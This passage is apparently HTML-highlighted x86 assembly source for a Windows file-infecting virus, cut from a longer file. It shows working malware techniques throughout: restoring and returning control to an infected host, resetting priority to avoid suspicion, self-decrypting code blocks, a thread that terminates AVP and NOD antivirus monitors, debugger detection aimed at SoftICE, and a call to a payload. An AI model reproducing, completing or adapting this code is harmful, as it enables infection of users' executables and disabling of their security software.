    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; main thread is finished</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; Push -1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; Push main thread handle</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_WaitForSingleObject</span><span class="sc0">

</span><span class="sc5">eBlock1</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">                       </span><span class="sc1">; Put again the original </span><span class="sc0">
</span><span class="sc5">OriginalPriorityClass</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">                 </span><span class="sc1">; priority of the process for</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">                       </span><span class="sc1">; avoid suspitions</span><span class="sc0">
</span><span class="sc5">CurrentProcessHandle</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetPriorityClass</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">WFD_HndSize</span><span class="sc0">                     </span><span class="sc1">; Hook some mem for WFD_Handles</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">                       </span><span class="sc1">; structure</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GlobalAlloc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_HndInMem</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">payload</span><span class="sc0">                         </span><span class="sc1">; Hohohohoho!</span><span class="sc0">

</span><span class="sc5">ErrorCreatingMainThread</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                         </span><span class="sc1">; Is 1st gen?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">fakehost</span><span class="sc0">                        </span><span class="sc1">; If so, jump to the fake host</span><span class="sc0">

</span><span class="sc5">RestoreSEH</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; EBX = 0</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Restore old SEH handler</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; Remove shit from stack</span><span class="sc0">

    </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">; Restore old registers</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RestoreOldBytes</span><span class="sc0">                 </span><span class="sc1">; Restore host's 1st bytes</span><span class="sc0">

    </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">; Restore all!</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">                   </span><span class="sc1">; C'mon! </span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">OldEIP</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00001000h</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">                   </span><span class="sc1">; It's on!</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">ModBase</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00400000h</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">; Pass control to the host</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">; code...</span><span class="sc0">

</span><span class="sc1">; Justice is lost, justice is raped, justice is gone...</span><span class="sc0">

</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;|| Restore the first 256 bytes of the host                                ||</span><span class="sc0">
</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">

</span><span class="sc5">RestoreOldBytes</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldEIP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ModBase</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; EDI = Ptr to host's EP</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldBytes</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; ESI = Ptr to its orig. bytes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">pLIMIT</span><span class="sc0">                      </span><span class="sc1">; ECX = Bytes to restore</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                           </span><span class="sc1">; Restore it!</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;|| The main thread of the virus                                           ||</span><span class="sc0">
</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Higher you are, harder you fall</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">MainThread</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">PASCAL</span><span class="sc0"> </span><span class="sc5">delta_thread</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc5">delta_thread</span><span class="sc0">                </span><span class="sc1">; EBP = Delta offset</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MT_SetupSEH</span><span class="sc0">                     </span><span class="sc1">; SetUp a new SEH handler</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">MT_RestoreSEH</span><span class="sc0">
</span><span class="sc5">MT_SetupSEH</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
       
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">iENC_decrypt</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">eBlock2</span><span class="sc4">-</span><span class="sc5">Block2</span><span class="sc0">

</span><span class="sc5">Block2</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetUsefulInfo</span><span class="sc0">                   </span><span class="sc1">; Retrieve useful info</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">nThreads</span><span class="sc0">                    </span><span class="sc1">; ECX = Number of threads to</span><span class="sc0">
                        </span><span class="sc1">;       launch</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ThreadsTable</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; ESI = Ptr to thread table</span><span class="sc0">

</span><span class="sc5">LoopOfLaunchAllThreads</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; Preserve ECX</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; EDX = 0</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lpThreadId</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; lpThreadId</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; dwCreationFlags</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">; lpParameter</span><span class="sc0">

    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; lpStartAddress</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; dwStackSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; lpThreadAttributes</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CreateThread</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">LoopOfLaunchAllThreads</span><span class="sc0">

</span><span class="sc1">; Control loops of all threads</span><span class="sc0">
       
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TKM_semaphore</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Init Thread 1</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TAD_semaphore</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Init Thread 2</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TDC_semaphore</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Init Thread 3</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TPP_semaphore</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Init Thread 4</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TPI_semaphore</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Init Thread 5 </span><span class="sc0">

</span><span class="sc5">TAD_CL</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TAD_semaphore</span><span class="sc4">],</span><span class="sc5">THREAD_SLEEPING</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">TAD_CL</span><span class="sc0">                          </span><span class="sc1">; Wait for Thread 2 end</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SoftICE</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">TKM_CL</span><span class="sc0">

</span><span class="sc5">TPI_CL</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TPI_semaphore</span><span class="sc4">],</span><span class="sc5">THREAD_SLEEPING</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">TPI_CL</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TIF_semaphore</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Init Thread 6 after Thread 5</span><span class="sc0">
</span><span class="sc5">TIF_CL</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TIF_semaphore</span><span class="sc4">],</span><span class="sc5">THREAD_SLEEPING</span><span class="sc0"> </span><span class="sc1">; ends</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">TIF_CL</span><span class="sc0">

</span><span class="sc5">TKM_CL</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TKM_semaphore</span><span class="sc4">],</span><span class="sc5">THREAD_SLEEPING</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">TKM_CL</span><span class="sc0">                          </span><span class="sc1">; Wait for Thread 1 end</span><span class="sc0">

</span><span class="sc5">TDC_CL</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TDC_semaphore</span><span class="sc4">],</span><span class="sc5">THREAD_SLEEPING</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">TDC_CL</span><span class="sc0">                          </span><span class="sc1">; Wait for Thread 3 end</span><span class="sc0">

</span><span class="sc5">TPP_CL</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TPP_semaphore</span><span class="sc4">],</span><span class="sc5">THREAD_SLEEPING</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">TPP_CL</span><span class="sc0">                          </span><span class="sc1">; Wait for Thread 4 end</span><span class="sc0">

</span><span class="sc5">eBlock2</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">MT_RestoreSEH</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ExitThread</span><span class="sc0">
</span><span class="sc5">MainThread</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;|| This procedure makes the thread that call it to be closed              ||</span><span class="sc0">
</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">

</span><span class="sc5">ExitThread</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_ExitThread</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;|| Thread used for kill TSR monitors (AVP &amp; NOD)                          ||</span><span class="sc0">
</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">

</span><span class="sc5">ThrKillMonitors</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">PASCAL</span><span class="sc0"> </span><span class="sc5">delta_thread</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc5">delta_thread</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">TKM_Sleep</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">THREAD_SLEEPING</span><span class="sc0">
</span><span class="sc5">TKM_semaphore</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">TKM_Sleep</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TKM_SetupSEH</span><span class="sc0">                    </span><span class="sc1">; SetUp a SEH handler</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">TKM_RestoreSEH</span><span class="sc0">
</span><span class="sc5">TKM_SetupSEH</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">iENC_decrypt</span><span class="sc0">                    </span><span class="sc1">; Encrypt this block</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">eBlock3</span><span class="sc4">-</span><span class="sc5">Block3</span><span class="sc0">

</span><span class="sc5">Block3</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Monitors2Kill</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; EDI = Ptr to array of mons.</span><span class="sc0">
</span><span class="sc5">KM_L00p</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TerminateProc</span><span class="sc0">                   </span><span class="sc1">; Terminate its process</span><span class="sc0">
    </span><span class="sc5">eosz_edi</span><span class="sc0">                                </span><span class="sc1">; End Of String of EDI</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc5">Billy_Bel</span><span class="sc0">        </span><span class="sc1">; End of array? </span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">KM_L00p</span><span class="sc0">                         </span><span class="sc1">; Kewl.</span><span class="sc0">

</span><span class="sc5">eBlock3</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">TKM_RestoreSEH</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TKM_semaphore</span><span class="sc4">],</span><span class="sc5">THREAD_SLEEPING</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ExitThread</span><span class="sc0">
</span><span class="sc5">ThrKillMonitors</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;|| Thread for kill the application level debuggers                        ||</span><span class="sc0">
</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">

</span><span class="sc5">ThrAntiDebugger</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">PASCAL</span><span class="sc0"> </span><span class="sc5">delta_thread</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc5">delta_thread</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">TAD_Sleep</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">THREAD_SLEEPING</span><span class="sc0">
</span><span class="sc5">TAD_semaphore</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">TAD_Sleep</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TAD_SetupSEH</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">TAD_RestoreSEH</span><span class="sc0">
</span><span class="sc5">TAD_SetupSEH</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">iENC_decrypt</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">eBlock4</span><span class="sc4">-</span><span class="sc5">Block4</span><span class="sc0">

</span><span class="sc5">Block4</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SoftICE</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc1">; I'm a SoftICE addict... any problem? :)</span><span class="sc0">

    </span><span class="sc9">IF</span><span class="sc0">      </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc9">ELSE</span><span class="sc0">
</span><span class="sc5">DetectSICE</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Drivers2Avoid</span><span class="sc4">]</span><span class="sc0">
